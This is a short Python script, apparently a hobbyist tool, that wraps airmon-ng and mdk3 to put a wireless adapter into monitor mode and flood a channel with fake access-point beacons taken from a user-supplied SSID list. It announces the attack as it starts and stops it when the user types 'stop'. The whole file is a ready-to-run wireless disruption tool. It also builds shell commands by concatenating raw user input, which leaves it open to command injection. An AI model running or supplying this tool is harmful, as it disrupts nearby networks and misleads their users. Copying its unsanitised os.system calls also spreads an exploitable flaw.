import psutil
import os

print(",------.         ,---.  ,------.  \n|  .---',-----. /  O  \ |  .--. ' \n|  `--, '-----'|  .-.  ||  '--' | \n|  |`          |  | |  ||  | --'  \n`--'           `--' `--'`--'      v.1.0 by X_9\n\nWELCOME TO MY TOOL :)\n\n--YOU'RE INTERFACES CARDS NAME'S:\n\n")

#INTERFACES:

addrs = psutil.net_if_addrs()
interface_names = list(addrs.keys())
for name in interface_names:
    print(name)

print("\n")

inter = input("> enter the *name* of you're network adapter: ")



os.system("clear");print("\n")

path = input("enter you're wifi name path. exm: .../../path.lst: ")

os.system("airmon-ng start "+inter)
print("\n\nSuccesfully monitor mode enabled\nAttack Start.\nAttack Start..\nAttack Start...\nAttack Start....\nAttack Start.....\n")
os.system("mdk3 "+inter+" b -c 1 -f "+path)

x = input("say *stop* if you want to stop the attack: ")

if x == "stop":
    os.system("airmon-ng stop "+inter)
    os.system("systemctl restart NetworkManager")
    os.system("airmon-ng stop "+inter)
    os.system("airmon-ng check kill")
    os.system("airmon-ng stop "+inter)
    os.system("systemctl restart NetworkManager")

    os.system("clear")
    print("IF YOU HAVE A PROBLEMS IN THE INTERNET CONNECTION RESTART YOU'RE OS")
    print("\n\nTHANK YOU FOR USING MY TOOL :)")
#FINISH